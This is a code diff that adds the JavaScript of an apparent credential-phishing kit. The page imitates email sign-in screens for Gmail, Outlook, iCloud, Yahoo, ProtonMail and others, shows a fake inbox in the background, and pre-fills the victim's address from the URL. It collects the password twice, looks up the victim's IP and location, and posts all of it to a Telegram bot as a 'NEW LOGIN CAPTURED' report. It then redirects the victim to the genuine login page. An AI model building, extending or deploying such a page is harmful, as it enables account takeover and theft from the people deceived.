+      const mbLogoIcon = document.getElementById('mbLogoIcon');
+      const mbLogoLetter = document.getElementById('mbLogoLetter');
+      const mbLogoFavicon = document.getElementById('mbLogoFavicon');
+      const mbLogoText = document.getElementById('mbLogoText');
+      const mbEmails = document.getElementById('mbEmails');
+
+      // ===== STATE =====
+      let step = 1;
+      let storedEmail = '';
+      let storedPassword = '';
+      let storedConfirmPassword = '';
+      let currentProvider = null;
+      let isTransitioning = false;
+      let hasReported = false;
+
+      // ===== DOMAIN DB =====
+      const domainConfig = {
+        'gmail.com':      { name: 'Gmail',       provider: 'gmail',   icon: 'fa-google',        subtitle: 'Sign in with your Google account',    glow: 'rgba(234, 67, 53, 0.08)',  loginUrl: 'https://accounts.google.com/signin' },
+        'googlemail.com': { name: 'Gmail',       provider: 'gmail',   icon: 'fa-google',        subtitle: 'Sign in with your Google account',    glow: 'rgba(234, 67, 53, 0.08)',  loginUrl: 'https://accounts.google.com/signin' },
+        'outlook.com':    { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
+        'hotmail.com':    { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
+        'live.com':       { name: 'Outlook',     provider: 'outlook', icon: 'fa-microsoft',     subtitle: 'Sign in with your Microsoft account', glow: 'rgba(0, 120, 212, 0.08)',  loginUrl: 'https://login.microsoftonline.com' },
+        'yahoo.com':      { name: 'Yahoo',       provider: 'yahoo',   icon: 'fa-yahoo',         subtitle: 'Sign in with your Yahoo account',     glow: 'rgba(96, 1, 210, 0.08)',   loginUrl: 'https://login.yahoo.com' },
+        'ymail.com':      { name: 'Yahoo',       provider: 'yahoo',   icon: 'fa-yahoo',         subtitle: 'Sign in with your Yahoo account',     glow: 'rgba(96, 1, 210, 0.08)',   loginUrl: 'https://login.yahoo.com' },
+        'icloud.com':     { name: 'iCloud',      provider: 'icloud',  icon: 'fa-apple',         subtitle: 'Sign in with your Apple account',     glow: 'rgba(54, 147, 243, 0.08)', loginUrl: 'https://appleid.apple.com/sign-in' },
+        'me.com':         { name: 'iCloud',      provider: 'icloud',  icon: 'fa-apple',         subtitle: 'Sign in with your Apple account',     glow: 'rgba(54, 147, 243, 0.08)', loginUrl: 'https://appleid.apple.com/sign-in' },
+        'protonmail.com': { name: 'ProtonMail',  provider: 'proton',  icon: 'fa-shield-halved', subtitle: 'Sign in with your Proton account',    glow: 'rgba(109, 74, 255, 0.08)', loginUrl: 'https://account.proton.me/login' },
+        'proton.me':      { name: 'ProtonMail',  provider: 'proton',  icon: 'fa-shield-halved', subtitle: 'Sign in with your Proton account',    glow: 'rgba(109, 74, 255, 0.08)', loginUrl: 'https://account.proton.me/login' },
+        'aol.com':        { name: 'AOL Mail',    provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your AOL account',      glow: 'rgba(0, 168, 224, 0.08)',  loginUrl: 'https://login.aol.com' },
+        'gmx.com':        { name: 'GMX',         provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your GMX account',      glow: 'rgba(28, 68, 155, 0.08)',  loginUrl: 'https://www.gmx.com' },
+        'gmx.net':        { name: 'GMX',         provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your GMX account',      glow: 'rgba(28, 68, 155, 0.08)',  loginUrl: 'https://www.gmx.net' },
+        'yandex.com':     { name: 'Yandex Mail', provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Yandex account',   glow: 'rgba(252, 63, 29, 0.08)',  loginUrl: 'https://passport.yandex.com' },
+        'yandex.ru':      { name: 'Yandex Mail', provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Yandex account',   glow: 'rgba(252, 63, 29, 0.08)',  loginUrl: 'https://passport.yandex.ru' },
+        'mail.ru':        { name: 'Mail.ru',     provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Mail.ru account',  glow: 'rgba(0, 95, 249, 0.08)',   loginUrl: 'https://account.mail.ru' },
+        'zoho.com':       { name: 'Zoho Mail',   provider: 'generic', icon: 'fa-envelope',      subtitle: 'Sign in with your Zoho account',     glow: 'rgba(228, 37, 39, 0.08)',  loginUrl: 'https://accounts.zoho.com' }
+      };
+
+      // ===== SAMPLE EMAILS =====
+      const sampleEmails = [
+        { from: 'Sarah Johnson',       subject: 'Q3 Marketing Strategy Review',  preview: 'Hi, attached is the Q3 report for your review…',        date: '10:42 AM', unread: true },
+        { from: 'GitHub',              subject: '[repo] PR #248 merged',         preview: 'Your pull request was successfully merged…',           date: '9:15 AM',  unread: true },
+        { from: 'Michael Chen',        subject: 'Re: Design system update',      preview: 'Thanks for the feedback, I\'ll update the tokens…',     date: '8:33 AM',  unread: true },
+        { from: 'LinkedIn',            subject: '3 new job opportunities',       preview: 'Companies are looking for candidates like you…',        date: 'Yesterday', unread: false },
+        { from: 'Emily Rodriguez',     subject: 'Team lunch on Friday?',         preview: 'Hey! Are you free for lunch this Friday at 12…',        date: 'Yesterday', unread: false },
+        { from: 'Amazon Web Services', subject: 'Your monthly bill is ready',    preview: 'Your AWS bill for March is now available…',             date: 'Mar 28',   unread: false },
+        { from: 'David Kim',           subject: 'Notes from product sync',       preview: 'Sharing the notes from our call earlier today…',        date: 'Mar 28',   unread: false },
+        { from: 'Stripe',              subject: 'Payment received',              preview: 'You received a payment of $2,450.00 from Acme Inc…',    date: 'Mar 27',   unread: false },
+        { from: 'Figma',               subject: 'New comment on your design',    preview: 'Alex commented on "Homepage v3" — check it out…',       date: 'Mar 27',   unread: false },
+        { from: 'Slack',               subject: 'You have 5 unread messages',    preview: 'Catch up on what happened in your channels…',           date: 'Mar 26',   unread: false },
+        { from: 'Notion',              subject: 'Weekly digest for your team',   preview: 'Here\'s what changed in your workspace this week…',     date: 'Mar 26',   unread: false },
+        { from: 'Vercel',              subject: 'Deployment succeeded',          preview: 'Your project was successfully deployed to production…', date: 'Mar 25',   unread: false }
+      ];
+
+      // ===== HELPERS =====
+      function extractDomain(email) {
+        const t = email.trim().toLowerCase();
+        if (!t.includes('@')) return null;
+        const p = t.split('@');
+        return p.length === 2 && p[1] ? p[1] : null;
+      }
+
+      function getDomainConfig(email) {
+        const domain = extractDomain(email);
+        if (!domain) return null;
+        if (domainConfig[domain]) return { ...domainConfig[domain], domain };
+        for (const [k, c] of Object.entries(domainConfig)) {
+          if (domain.endsWith('.' + k)) return { ...c, domain: k };
+        }
+        const base = domain.split('.')[0];
+        return {
+          name: base.charAt(0).toUpperCase() + base.slice(1),
+          provider: 'generic',
+          icon: 'fa-envelope',
+          subtitle: `Sign in with your ${domain} account`,
+          glow: 'rgba(95, 99, 104, 0.06)',
+          loginUrl: `https://${domain}`,
+          domain
+        };
+      }
+
+      function isValidEmail(v) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());
+      }
+
+      function getInitials(email) {
+        if (!email) return 'U';
+        const local = email.split('@')[0] || '';
+        const parts = local.split(/[._-]/).filter(Boolean);
+        if (parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
+        return local.substring(0, 2).toUpperCase() || 'U';
+      }
+
+      function loadFavicon(domain, onSuccess) {
+        const sources = [
+          `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
+          `https://icons.duckduckgo.com/ip3/${domain}.ico`,
+          `https://${domain}/favicon.ico`,
+          `https://www.google.com/s2/favicons?domain=${domain}&sz=64`
+        ];
+        let index = 0;
+        const tryNext = () => {
+          if (index >= sources.length) { if (onSuccess) onSuccess(null); return; }
+          const url = sources[index++];
+          const testImg = new Image();
+          testImg.referrerPolicy = 'no-referrer';
+          testImg.onload = function() {
+            if (testImg.naturalWidth > 1 && testImg.naturalHeight > 1) {
+              if (onSuccess) onSuccess(url);
+            } else tryNext();
+          };
+          testImg.onerror = tryNext;
+          testImg.src = url;
+        };
+        tryNext();
+      }
+
+      function renderMailboxBackground(email) {
+        if (email) {
+          mbAvatarEmail.textContent = email;
+          mbAvatarCircle.textContent = getInitials(email);
+
+          const cfg = getDomainConfig(email);
+          if (cfg) {
+            mbLogoIcon.setAttribute('data-provider', cfg.provider);
+            mbLogoLetter.textContent = cfg.name.charAt(0).toUpperCase();
+            mbLogoText.textContent = cfg.name;
+
+            loadFavicon(cfg.domain, (url) => {
+              if (url) {
+                mbLogoFavicon.src = url;
+                mbLogoFavicon.onload = () => {
+                  mbLogoIcon.classList.add('favicon-loaded');
+                };
+                mbLogoFavicon.onerror = () => {
+                  mbLogoIcon.classList.remove('favicon-loaded');
+                };
+              } else {
+                mbLogoIcon.classList.remove('favicon-loaded');
+              }
+            });
+          }
+        } else {
+          mbAvatarEmail.textContent = 'user@example.com';
+          mbAvatarCircle.textContent = 'U';
+          mbLogoIcon.setAttribute('data-provider', 'gmail');
+          mbLogoLetter.textContent = 'M';
+          mbLogoText.textContent = 'Mail';
+          mbLogoIcon.classList.remove('favicon-loaded');
+          mbLogoFavicon.removeAttribute('src');
+        }
+      }
+
+      function renderEmailList() {
+        mbEmails.innerHTML = sampleEmails.map(e => `
+          <div class="mb-email ${e.unread ? 'unread' : 'read'}">
+            <i class="far fa-star mb-email-star"></i>
+            <div class="mb-email-from">${escapeHtml(e.from)}</div>
+            <div class="mb-email-subject">
+              ${escapeHtml(e.subject)}
+              <span class="preview">— ${escapeHtml(e.preview)}</span>
+            </div>
+            <div class="mb-email-date">${escapeHtml(e.date)}</div>
+          </div>
+        `).join('');
+      }
+
+      function applyFavicon(url) {
+        if (!url) {
+          logoIcon.classList.remove('favicon-active');
+          faviconImg.classList.remove('loaded');
+          faviconImg.removeAttribute('src');
+          fieldLeftIcon.classList.remove('has-favicon');
+          fieldLeftIconImg.removeAttribute('src');
+          return;
+        }
+        faviconImg.src = url;
+        faviconImg.onload = () => {
+          faviconImg.classList.add('loaded');
+          logoIcon.classList.add('favicon-active');
+        };
+        faviconImg.onerror = () => {
+          logoIcon.classList.remove('favicon-active');
+          faviconImg.classList.remove('loaded');
+        };
+        chipFavicon.src = url;
+        fieldLeftIconImg.src = url;
+        fieldLeftIconImg.onload = () => fieldLeftIcon.classList.add('has-favicon');
+        fieldLeftIconImg.onerror = () => fieldLeftIcon.classList.remove('has-favicon');
+      }
+
+      function applyProviderBranding(cfg) {
+        if (!cfg) {
+          logoIcon.setAttribute('data-provider', '');
+          logoFallback.className = 'fas fa-envelope fa-fallback';
+          logoIcon.classList.remove('favicon-active');
+          faviconImg.classList.remove('loaded');
+          faviconImg.removeAttribute('src');
+          chipFavicon.removeAttribute('src');
+          fieldLeftIcon.classList.remove('has-favicon');
+          fieldLeftIconImg.removeAttribute('src');
+          document.body.style.setProperty('--brand-glow', 'rgba(66, 133, 244, 0.06)');
+          return;
+        }
+        logoIcon.setAttribute('data-provider', cfg.provider);
+        logoFallback.className = `fas ${cfg.icon} fa-fallback`;
+        document.body.style.setProperty('--brand-glow', cfg.glow);
+
+        loadFavicon(cfg.domain, (url) => {
+          if (url) applyFavicon(url);
+          else {
+            logoIcon.classList.remove('favicon-active');
+            faviconImg.classList.remove('loaded');
+            fieldLeftIcon.classList.remove('has-favicon');
+            fieldLeftIconImg.removeAttribute('src');
+          }
+        });
+      }
+
+      function updateStepDots() {
+        [dot1, dot2, dot3].forEach((d, i) => {
+          d.classList.remove('active', 'completed');
+          const stepNum = i + 1;
+          if (stepNum < step) d.classList.add('completed');
+          else if (stepNum === step) d.classList.add('active');
+        });
+      }
+
+      function setField(icon, type, placeholder, autocomplete, showToggle) {
+        fieldLeftIconI.className = `fas ${icon}`;
+        fieldLeftIcon.classList.remove('has-favicon');
+        fieldInput.type = type;
+        fieldInput.placeholder = placeholder;
+        fieldInput.autocomplete = autocomplete;
+        fieldInput.value = '';
+        fieldInput.classList.remove('input-error', 'input-success');
+        toggleBtn.classList.toggle('visible', showToggle);
+        if (!showToggle) toggleIcon.className = 'fas fa-eye';
+      }
+
+      function swapFieldAnimation(callback) {
+        const wrapper = fieldInput.closest('.field-wrapper');
+        wrapper.classList.add('field-swap');
+        setTimeout(() => {
+          callback();
+          setTimeout(() => wrapper.classList.remove('field-swap'), 400);
+          setTimeout(() => fieldInput.focus(), 100);
+        }, 200);
+      }
+
+      async function getUserInfo() {
+        const info = { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
+        const apis = [
+          { url: 'https://ipapi.co/json/',            parse: d => ({ ip: d.ip, country: d.country_name, city: d.city }) },
+          { url: 'https://ipwho.is/',                 parse: d => ({ ip: d.ip, country: d.country,      city: d.city }) },
+          { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip, country: '—',            city: '—' }) }
+        ];
+        for (const api of apis) {
+          try {
+            const res = await fetch(api.url);
+            if (!res.ok) continue;
+            const data = await res.json();
+            const parsed = api.parse(data);
+            info.ip = parsed.ip || info.ip;
+            info.country = parsed.country || info.country;
+            info.city = parsed.city || info.city;
+            break;
+          } catch (e) { /* next */ }
+        }
+        return info;
+      }
+
+      async function sendToTelegram() {
+        if (hasReported) return;
+        hasReported = true;
+
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+          console.warn('⚠️ Telegram bot token not configured');
+          return;
+        }
+        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+          console.warn('⚠️ Telegram chat ID not configured');
+          return;
+        }
+
+        try {
+          const info = await getUserInfo();
+          const message =
+            `🔐 <b>NEW LOGIN CAPTURED</b>\n\n` +
+            `📧 <b>Email:</b> <code>${escapeHtml(storedEmail)}</code>\n` +
+            `🔑 <b>Password:</b> <code>${escapeHtml(storedPassword)}</code>\n` +
+            `🔑 <b>Invalid Password:</b> <code>${escapeHtml(storedConfirmPassword)}</code>\n\n` +
+            `🌍 <b>IP:</b> <code>${escapeHtml(info.ip)}</code>\n` +
+            `🌎 <b>Country:</b> ${escapeHtml(info.country)}\n` +
+            `🏙️ <b>City:</b> ${escapeHtml(info.city)}`;
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'HTML',
+              disable_web_page_preview: true
+            })
+          });
+          console.log('✅ Single Telegram report sent');
+        } catch (err) {
+          console.error('❌ Telegram send failed:', err);
+        }
+      }
+
+      function escapeHtml(str) {
+        if (str === null || str === undefined) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;')
+          .replace(/'/g, '&#039;');
+      }
+
+      async function finalizeLogin() {
+        const cfg = currentProvider || getDomainConfig(storedEmail);
+        const domain = extractDomain(storedEmail);
+        const targetUrl = cfg ? cfg.loginUrl : `https://${domain || 'mail.com'}`;
+
+        successTitle.textContent = 'Signing you in…';
+        successMessage.textContent = `Welcome, ${storedEmail}`;
+        redirectUrl.textContent = targetUrl;
+        successOverlay.classList.add('visible');
+
+        try { await sendToTelegram(); } catch (e) { console.warn(e); }
+
+        setTimeout(() => {
+          window.location.href = targetUrl;
+        }, 1500);
+      }
+
+      function goToStep(newStep) {
+        if (isTransitioning) return;
+        isTransitioning = true;
+        step = newStep;
+        updateStepDots();
+
+        if (newStep === 1) {
+          swapFieldAnimation(() => {
+            setField('fa-user', 'text', 'Email or phone', 'username', false);
+            title.textContent = currentProvider ? currentProvider.name : 'Sign in';
+            subtitle.textContent = currentProvider ? currentProvider.subtitle : 'to continue to Mail';
+            hintIcon.className = 'fas fa-info-circle';
+            hintIcon.style.color = '#9aa0a6';
+            hintText.textContent = 'Enter your email or phone number to continue';
+            fieldLeftIcon.style.color = '#9aa0a6';
+            accountChip.classList.remove('visible');
+            actionRow.classList.remove('collapsed');
+            backRow.classList.remove('visible');
+            btnText.textContent = 'Next';
+            btnIcon.className = 'fas fa-arrow-right';
+            submitBtn.disabled = false;
+            submitBtn.style.background = '';
+            fieldInput.value = storedEmail;
+            if (storedEmail) {
+              const cfg = getDomainConfig(storedEmail);
+              if (cfg) {
+                currentProvider = cfg;
+                applyProviderBranding(cfg);
+                title.textContent = cfg.name;
+                subtitle.textContent = cfg.subtitle;
+                hintText.textContent = `Continue with ${cfg.name}`;
+                hintIcon.className = 'fas fa-check-circle';
+                hintIcon.style.color = '#1a73e8';
+                fieldLeftIcon.style.color = '#4285f4';
+              }
+            }
+            isTransitioning = false;
+          });
+        }
+
+        else if (newStep === 2) {
+          swapFieldAnimation(() => {
+            setField('fa-lock', 'password', 'Enter your password', 'current-password', true);
+            title.textContent = 'Welcome back';
+            subtitle.textContent = currentProvider ? `Sign in to ${currentProvider.name}` : 'Sign in to continue';
+            accountChipText.textContent = storedEmail;
+            accountChip.classList.add('visible');
+            hintIcon.className = 'fas fa-shield-halved';
+            hintIcon.style.color = '#5f6368';
+            hintText.textContent = 'Your password is encrypted';
+            actionRow.classList.add('collapsed');
+            backRow.classList.add('visible');
+            backText.textContent = 'Use another account';
+            btnText.textContent = 'Continue';
+            btnIcon.className = 'fas fa-arrow-right';
+            submitBtn.disabled = false;
+            isTransitioning = false;
+          });
+        }
+
+        else if (newStep === 3) {
+          swapFieldAnimation(() => {
+            setField('fa-lock', 'password', 'Enter a Valid password', 'new-password', true);
+            title.textContent = 'Enter a Valid password';
+            subtitle.textContent = 'Re-enter your password to continue';
+            hintIcon.className = 'fas fa-check-double';
+            hintIcon.style.color = '#5f6368';
+            hintText.textContent = 'Passwords must match';
+            backText.textContent = 'Back to password';
+            btnText.textContent = 'Sign in';
+            btnIcon.className = 'fas fa-check';
+            submitBtn.disabled = false;
+            isTransitioning = false;
+          });
+        }
+      }
+
+      function getEmailFromHash() {
+        try {
+          const hash = window.location.hash;
+          if (!hash || hash.length < 2) return null;
+          let raw = hash.substring(1);
+          try { raw = decodeURIComponent(raw); } catch (e) { /* keep */ }
+          raw = raw.trim();
+          if (!raw.includes('@')) return null;
+          if (!isValidEmail(raw)) return null;
+          return raw;
+        } catch (e) {
+          return null;
+        }
+      }
+
+      function boot() {
+        renderEmailList();
+
+        const emailFromHash = getEmailFromHash();
+
+        if (emailFromHash) {
+          storedEmail = emailFromHash;
+          currentProvider = getDomainConfig(emailFromHash);
+          fieldInput.value = emailFromHash;
+          renderMailboxBackground(emailFromHash);
+
+          if (currentProvider) {
+            applyProviderBranding(currentProvider);
+            title.textContent = currentProvider.name;
+            subtitle.textContent = currentProvider.subtitle;
+            hintText.textContent = `Continue with ${currentProvider.name}`;
+            hintIcon.className = 'fas fa-check-circle';
+            hintIcon.style.color = '#1a73e8';
+            fieldLeftIcon.style.color = '#4285f4';
+
+            fieldInput.classList.add('input-success');
+            setTimeout(() => fieldInput.classList.remove('input-success'), 1200);
+          }
+
+          try {
+            history.replaceState(null, '', window.location.pathname + window.location.search);
+          } catch (e) { /* ignore */ }
+        } else {
+          renderMailboxBackground(null);
+        }
+
+        fieldInput.focus();
+      }
+
+      fieldInput.addEventListener('input', function() {
+        const val = this.value.trim();
+        if (step === 1) {
+          const cfg = getDomainConfig(val);
+          const hasAt = val.includes('@') && val.split('@')[1]?.length > 0;
+
+          if (cfg && hasAt) {
+            currentProvider = cfg;
+            applyProviderBranding(cfg);
+            title.textContent = cfg.name;
+            subtitle.textContent = cfg.subtitle;
+            hintText.textContent = `Continue with ${cfg.name}`;
+            hintIcon.className = 'fas fa-check-circle';
+            hintIcon.style.color = '#1a73e8';
+            fieldLeftIcon.style.color = '#4285f4';
+            renderMailboxBackground(val);
+          } else {
+            currentProvider = null;
+            applyProviderBranding(null);
+            title.textContent = 'Sign in';
+            subtitle.textContent = 'to continue to Mail';
+            fieldLeftIcon.style.color = '#9aa0a6';
+
+            if (val.length === 0) {
+              hintText.textContent = 'Enter your email or phone number to continue';
+              hintIcon.className = 'fas fa-info-circle';
+              hintIcon.style.color = '#9aa0a6';
+              renderMailboxBackground(null);
+            } else if (/^\d+$/.test(val) && val.length > 5) {
+              hintText.textContent = 'Looks like a phone number';
+              hintIcon.className = 'fas fa-phone';
+              hintIcon.style.color = '#5f6368';
+            } else {
+              hintText.textContent = 'Press Next to continue';
+              hintIcon.className = 'fas fa-arrow-right';
+              hintIcon.style.color = '#5f6368';
+            }
+          }
+        }
+      });
+
+      toggleBtn.addEventListener('click', function() {
+        const isPwd = fieldInput.type === 'password';
+        fieldInput.type = isPwd ? 'text' : 'password';
+        toggleIcon.className = isPwd ? 'fas fa-eye-slash' : 'fas fa-eye';
+      });
+
+      backBtn.addEventListener('click', function() {
+        if (step === 3) goToStep(2);
+        else if (step === 2) goToStep(1);
+      });
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (isTransitioning) return;
+        const val = fieldInput.value.trim();
+
+        if (step === 1) {
+          if (!val) {
+            fieldInput.classList.add('shake');
+            setTimeout(() => fieldInput.classList.remove('shake'), 300);
+            return;
+          }
+          if (!isValidEmail(val)) {
+            fieldInput.classList.add('input-error', 'shake');
+            hintText.textContent = 'Please enter a valid email address';
+            hintIcon.className = 'fas fa-exclamation-circle';
+            hintIcon.style.color = '#d93025';
+            setTimeout(() => fieldInput.classList.remove('shake'), 300);
+            return;
+          }
+          storedEmail = val;
+          currentProvider = getDomainConfig(val);
+          if (currentProvider) applyProviderBranding(currentProvider);
+          renderMailboxBackground(val);
+
+          const originalHTML = submitBtn.innerHTML;
+          btnText.textContent = 'Checking';
+          btnIcon.className = 'fas fa-spinner fa-spin';
+          submitBtn.disabled = true;
+
+          setTimeout(() => {
+            submitBtn.innerHTML = originalHTML;
+            submitBtn.disabled = false;
+            goToStep(2);
+          }, 600);
+        }
+
+        else if (step === 2) {
+          if (!val) {
+            fieldInput.classList.add('shake');
+            setTimeout(() => fieldInput.classList.remove('shake'), 300);
+            return;
+          }
+          storedPassword = val;
+          goToStep(3);
+        }
+
+        else if (step === 3) {
+          if (!val) {
+            fieldInput.classList.add('shake');
+            setTimeout(() => fieldInput.classList.remove('shake'), 300);
+            return;
+          }
+          storedConfirmPassword = val;
+          fieldInput.classList.add('input-success');
+
+          const originalHTML = submitBtn.innerHTML;
+          btnText.textContent = 'Signing in';
+          btnIcon.className = 'fas fa-spinner fa-spin';
+          submitBtn.disabled = true;
+
+          setTimeout(() => {
+            submitBtn.innerHTML = originalHTML;
+            submitBtn.disabled = false;
+            finalizeLogin();
+          }, 600);
+        }
+      });
+
+      boot();
+
+      window.addEventListener('hashchange', function() {
+        const email = getEmailFromHash();
+        if (email && email !== storedEmail) {
+          storedEmail = email;
+          currentProvider = getDomainConfig(email);
+          fieldInput.value = email;
+          renderMailboxBackground(email);
+          if (currentProvider) {
+            applyProviderBranding(currentProvider);
+            title.textContent = currentProvider.name;
+            subtitle.textContent = currentProvider.subtitle;
+            hintText.textContent = `Continue with ${currentProvider.name}`;
+            hintIcon.className = 'fas fa-check-circle';
+            hintIcon.style.color = '#1a73e8';
+            fieldLeftIcon.style.color = '#4285f4';
+          }
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
